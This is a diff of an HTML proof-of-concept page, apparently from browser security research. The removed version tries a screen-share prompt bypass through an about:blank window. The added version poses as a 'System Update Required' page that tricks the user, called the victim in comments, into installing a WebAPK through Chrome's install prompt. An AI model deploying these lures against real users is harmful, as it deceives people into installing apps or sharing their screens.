@@ -2,41 +2,52 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="manifest" href="manifest.json">
 <style>
   body { font-family: sans-serif; background: #202124; color: white; text-align: center; padding-top: 50px; }
-  .btn { background: #34a853; color: white; border: none; padding: 20px; font-size: 18px; border-radius: 10px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.3); width: 80%; }
+  .btn { background: #1a73e8; color: white; border: none; padding: 20px; font-size: 18px; border-radius: 10px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.3); width: 85%; display: none; }
+  #status { color: #9aa0a6; margin-bottom: 30px; font-size: 14px;}
 </style>
 </head>
 <body>
-  <h2>MediaProjection UI Bypass</h2>
-  <p style="color: #9aa0a6;">Target: Screen Share API</p>
+  <h2>System Update Required</h2>
+  <p id="status">Scanning device compatibility...</p>
   
-  <button class="btn" id="trigger">Start Screen Share</button>
+  <!-- Tombol ini cuma muncul kalo Chrome ngizinin instalasi -->
+  <button class="btn" id="installBtn">Install Security Update</button>
 
 <script>
-document.getElementById('trigger').addEventListener('click', () => {
-    // 1. Buka about:blank buat ngewarisin origin "ologoligature.github.io"
-    let victimWin = window.open('about:blank');
+let deferredPrompt;
+const installBtn = document.getElementById('installBtn');
+const statusText = document.getElementById('status');
+
+// Chrome mendeteksi manifest.json dan ngasih lampu hijau buat install
+window.addEventListener('beforeinstallprompt', (e) => {
+    e.preventDefault();
+    deferredPrompt = e;
     
-    // 2. Kasih instruksi di tab baru
-    setTimeout(() => {
-        victimWin.document.body.innerHTML = `
-            <body style="background:#202124; color:white; text-align:center; padding-top:40vh; font-family:sans-serif;">
-                <h3 style="color:#34a853;">👆 TAP ANYWHERE ON SCREEN 👆</h3>
-            </body>
-        `;
-        
-        // 3. Eksekusi Screen Share (Harus di-trigger pake klik di dalam about:blank)
-        victimWin.addEventListener('click', async () => {
-            try {
-                // Manggil UI MediaProjection bawaan OS Android
-                await victimWin.navigator.mediaDevices.getDisplayMedia({video: true});
-            } catch (err) {
-                console.log('User cancelled or error: ', err);
-            }
-        });
-    }, 150);
+    // Munculin tombol eksekusi
+    installBtn.style.display = 'block';
+    statusText.innerText = "Device compatible. Ready to install.";
 });
+
+// Aksi ketika korban klik tombol
+installBtn.addEventListener('click', async () => {
+    if (deferredPrompt) {
+        deferredPrompt.prompt();
+        const { outcome } = await deferredPrompt.userChoice;
+        if (outcome === 'accepted') {
+            statusText.innerText = "Installation prompt triggered successfully!";
+            installBtn.style.display = 'none';
+        }
+        deferredPrompt = null;
+    }
+});
+
+// Cek kalau lu lupa uninstall dari HP
+if (window.matchMedia('(display-mode: standalone)').matches) {
+    statusText.innerHTML = "⚠️ ERROR: WebAPK is already installed on this device.<br>Please uninstall it from your Home Screen to test the prompt again.";
+}
 </script>
 </body>
 </html>
